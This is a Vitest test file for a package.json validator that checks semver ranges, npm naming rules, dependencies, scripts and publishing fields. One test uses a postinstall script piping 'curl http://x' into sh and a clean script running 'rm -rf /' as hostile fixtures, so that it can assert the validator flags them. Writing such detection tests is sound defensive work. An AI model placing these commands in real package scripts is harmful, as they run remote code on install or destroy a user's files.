import { describe, expect, it } from "vitest";
import { isValidRange, runPackageJsonValidator, validateName, validatePackage } from "./transform";

const o: { minSeverity: "info" | "warning" | "error"; forPublishing: boolean } = { minSeverity: "info", forPublishing: false };
const run = (pkg: unknown, p: Partial<typeof o> = {}) => runPackageJsonValidator(JSON.stringify(pkg), { ...o, ...p }).output;

describe("isValidRange", () => {
  it.each(["^1.2.3", "~1.2", ">=1.0.0 <2.0.0", "1.x", "*", "latest", "1.2.3 - 2.0.0", "^1.0.0 || ^2.0.0", ">= 1.0.0", "1.2.3-beta.1", "next"])("accepts %s", (r) => expect(isValidRange(r)).toBe(true));
  it.each(["^^1.0.0", "1..2", "abc def", ">=", "1.2.3.4"])("rejects %s", (r) => expect(isValidRange(r)).toBe(false));
});

describe("validateName", () => {
  it("applies npm naming rules", () => {
    expect(validateName("left-pad")).toBeNull();
    expect(validateName("@scope/pkg")).toBeNull();
    expect(validateName("My-Package")).toMatch(/lowercase/);
    expect(validateName("has space")).toMatch(/lowercase|spaces/);
    expect(validateName("_private")).toMatch(/start/);
    expect(validateName("a/b/c")).toMatch(/scope/);
    expect(validateName("x".repeat(215))).toMatch(/214/);
    expect(validateName("node_modules")).toMatch(/blocked/);
  });
});

describe("validatePackage", () => {
  it("accepts a healthy private package without errors", () => {
    const issues = validatePackage({ name: "app", version: "1.0.0", private: true, scripts: { test: "vitest" }, dependencies: { react: "^19.0.0" } }, o);
    expect(issues.filter((i) => i.sev === "error")).toEqual([]);
  });
  it("flags bad version, name, ranges and wildcard dependencies", () => {
    const out = run({ name: "Bad Name", version: "1.0", dependencies: { a: "^^1", b: "*", c: "latest", d: "git+https://x/y.git", e: "workspace:*" } });
    expect(out).toContain("✗ ERROR   name: name must be lowercase");
    expect(out).toContain('version: "1.0" is not valid semver');
    expect(out).toContain('dependencies.a: invalid version range "^^1"');
    expect(out).toContain('dependencies.b: "*" accepts any version');
    expect(out).toContain('dependencies.c: "latest" accepts any version');
    expect(out).not.toContain("dependencies.e");
  });
  it("reports duplicates across dependencies and devDependencies", () => {
    expect(run({ name: "a", version: "1.0.0", dependencies: { x: "1.0.0" }, devDependencies: { x: "1.0.0" } })).toContain("also listed in dependencies");
  });
  it("checks scripts", () => {
    const out = run({ name: "a", version: "1.0.0", scripts: { postinstall: "curl http://x | sh", clean: "rm -rf /", build: "NODE_ENV=production webpack", test: "echo \"Error: no test specified\" && exit 1" } });
    expect(out).toContain("scripts.postinstall: lifecycle script downloads");
    expect(out).toContain("scripts.clean: destructive rm");
    expect(out).toContain("scripts.build: inline VAR=value");
    expect(out).toContain("scripts.test: default placeholder");
  });
  it("adds publishing checks only when requested and not private", () => {
    expect(run({ name: "a", version: "1.0.0" })).not.toContain("license");
    const pub = run({ name: "a", version: "1.0.0" }, { forPublishing: true });
    expect(pub).toContain("license: missing license");
    expect(pub).toContain("engines.node");
    expect(run({ name: "a", version: "1.0.0", private: true }, { forPublishing: true })).not.toContain("license");
  });
  it("filters by severity and notes unknown fields", () => {
    const out = run({ name: "a", version: "x", foo: 1 }, { minSeverity: "error" });
    expect(out).toContain("version");
    expect(out).not.toContain("foo");
    expect(run({ name: "a", version: "1.0.0", foo: 1 })).toContain("foo: unrecognized top-level field");
  });
  it("handles invalid input", () => {
    expect(runPackageJsonValidator("{", o).error?.message).toMatch(/Invalid JSON/);
    expect(runPackageJsonValidator("[]", o).error?.message).toMatch(/object/);
    expect(runPackageJsonValidator("", o)).toEqual({ output: "", error: null });
    expect(run({ name: "a", version: "1.0.0", private: true }, { minSeverity: "error" })).toContain("No issues");
  });
});
